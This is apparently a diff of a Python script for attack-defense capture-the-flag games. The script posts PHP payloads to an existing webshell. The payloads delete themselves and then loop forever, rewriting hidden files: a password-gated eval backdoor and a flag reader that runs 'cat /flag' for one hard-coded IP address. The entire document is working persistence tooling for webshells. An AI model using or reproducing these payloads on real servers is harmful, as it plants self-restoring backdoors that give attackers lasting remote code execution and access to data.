@@ -3,11 +3,11 @@ import requests
 import time
 import os
 #------------------------------------------------------------------------------------Edit-this-part----------
-trojan_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='需要改成.php';$code='<?php if(md5($_GET["pass"])=="507f546195544d36a02a24f1e73eb773"){@eval($_POST[a]);}?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}
+trojan_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='987.php';$code='<?php if(md5($_GET["pass"])=="507f546195544d36a02a24f1e73eb773"){@eval($_POST[a]);}?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}
 #---------------------------------------------------------------------------------------Edit-this-part----------
-get_flag_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='需要改成.php';$code='<?php $ip = $_SERVER["REMOTE_ADDR"];if($ip=="需要改我，改成自己IP"){echo("Administrator Confirmation.\r\n");system("cat /flag");}else echo(md5(mt_rand()));?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}
+get_flag_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='654.php';$code='<?php $ip = $_SERVER["REMOTE_ADDR"];if($ip=="221.192.180.114"){echo("Administrator Confirmation.\r\n");system("cat /flag");}else echo(md5(mt_rand()));?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}
 
-webshell_name = raw_input("Please input your webshell's name:")
+webshell_name = raw_input("Please input your webshell's name:(config.php)")
 trojan_name = raw_input("Please input your Undead Trojan Horse's name:")
 get_flag_name = raw_input("Please input your get flag file's name:")
 	
